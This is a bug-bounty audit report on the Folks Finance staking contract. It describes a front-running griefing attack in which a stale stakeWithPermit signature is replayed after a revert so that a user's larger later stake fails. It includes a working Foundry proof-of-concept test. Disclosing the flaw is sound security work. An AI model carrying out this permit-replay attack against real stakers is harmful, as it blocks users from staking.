# 69772 sc insight after a revert stakewithpermit might be prevented

Submitted on Mar 16th 2026 at 18:32:26 UTC by @max10afternoon for [Audit Comp | Folks Finance: Staking Contracts](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69772
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

After a revert, a second execution of `stakeWithPermit` can be prevented, as long as the second amount is larger (bypassing the try-catch protection).

## Vulnerability Details

If a `stakeWithPermit` call reverts (if either of the slipage/time checks fails or if there is not enought caps for that particular staking period), the correspondant signature for the permit will still be valid, as the nonce has never been consumed (due to the overall revert). Meaning that the following `stakeWithPermit` call can be front ran with the permit from the previous call, even if the amounts are different. This will set the allowance to the value specified on the first permit (as the permit of the second transaction will fail due to nonce reuse), and it will cause the second transaction to revert, as long as the new amount is larger than the previous, as the allowance from the first permit will not be large enough for the second execution.

This might happen if, after a revert on the first `stakeWithPermit` call, the user decides to stake on another staking index with different parameters (which may imply a different stake amount decision) or if they simply decide to stake a larger amount on the same period.

A `stakeWithPermit` call might revert due to the following safety checks, while still having enough liquidity for a larger deposit:

```solidity
        StakingPeriod storage stakingPeriod = stakingPeriods[periodIndex];
        if (!stakingPeriod.isActive) revert StakingPeriodInactive(periodIndex);

        // ensuring that staking period conditions were not updated in front of this operation
        if (stakingPeriod.stakingDurationSeconds > params.maxStakingDurationSeconds) {
            revert StakingPeriodStakingDurationDiffer(
                periodIndex, params.maxStakingDurationSeconds, stakingPeriod.stakingDurationSeconds
            );
        }
        if (stakingPeriod.unlockDurationSeconds > params.maxUnlockDurationSeconds) {
            revert StakingPeriodUnlockDurationDiffer(
                periodIndex, params.maxUnlockDurationSeconds, stakingPeriod.unlockDurationSeconds
            );
        }
        if (stakingPeriod.aprBps < params.minAprBps) {
            revert StakingPeriodAprDiffer(periodIndex, params.minAprBps, stakingPeriod.aprBps);
        }
```

Or if there are multiple staking periods available, also on:

```solidity
        uint256 updatedCapUsed = stakingPeriod.capUsed + amount;
        if (stakingPeriod.cap < updatedCapUsed) revert StakingCapReached(stakingPeriod.cap);
```

In this last case a malicous user can stake dust amount of tokens, to force the check to fail, if the staking user is trying to consume the entire cap (this will be the scenario implemented in the coded PoC).

### Deadline

Although there is a deadline parameter this is often set, in real and common implementations, to a large enough amount of time for this to be exploitable (eg. both uniswap and pancakeswap suggest deadlines of over 20 minutes, for similar functionalities. <https://github.com/joshstevens19/simple-pancakeswap-sdk> <https://docs.uniswap.org/sdk/v3/guides/swaps/trading> ). Meaning that it is feasible to grief the second execution of `stakeWithPermit` of a user that is manually interacting with the contract, on safe and often suggested values for this parameter.

## Impact Details

Griefing: under the right conditions a user can prevent others from staking into the contract.

## Proof of Concept

Add the following test case in the test file `/test/Staking.t.sol`:

```solidity
function test_Staking_StakeWithPermit_griefing() public {
    deal(address(token), address(staking), 1000 ether);
    deal(address(token), charlie, 1000 ether);
    deal(address(token), alice, 1 ether);

    uint8 periodIndex0 = addStakingPeriodByManager(50 ether, 20, 10, 5000, true);
    uint8 periodIndex1 = addStakingPeriodByManager(100 ether, 20, 10, 4000, true);

    //Charlie sign first stake with permit
    uint256 deadline = block.timestamp + 1 hours;
    (uint8 v0, bytes32 r0, bytes32 s0) = signCharliePermit(50 ether, deadline);

    //Alice consumes cap
    vm.prank(alice);
    token.approve(address(staking), 1);
    stake(alice, periodIndex0, 1, 20, 10, 5000, address(0));

    //Charlie stake exceedes cap:
    vm.expectRevert(abi.encodeWithSelector(IStakingV1.StakingCapReached.selector, 50 ether));
    stakeWithPermit(charlie, periodIndex0, 50 ether, 20, 10, 5000, address(0), deadline, v0, r0, s0);

    //Charlie signs a new permit (SINCE PREVIOUS CALL REVERSED THE NONCE HAVE NOT BEEN INCREASED):
    (uint8 v1, bytes32 r1, bytes32 s1) = signCharliePermit(100 ether, deadline);

    //Alice copies permit
    token.permit(charlie, address(staking), 50 ether, deadline, v0, r0, s0);

    //Charlie tries another staking period with a different ammount

    //Alice successfully prevents the transaction
    vm.expectRevert(
        abi.encodeWithSelector(IERC20Errors.ERC20InsufficientAllowance.selector, address(staking), 50 ether, 100 ether)
    );
    stakeWithPermit(charlie, periodIndex1, 100 ether, 20, 10, 4000, address(0), deadline, v1, r1, s1);
}
```
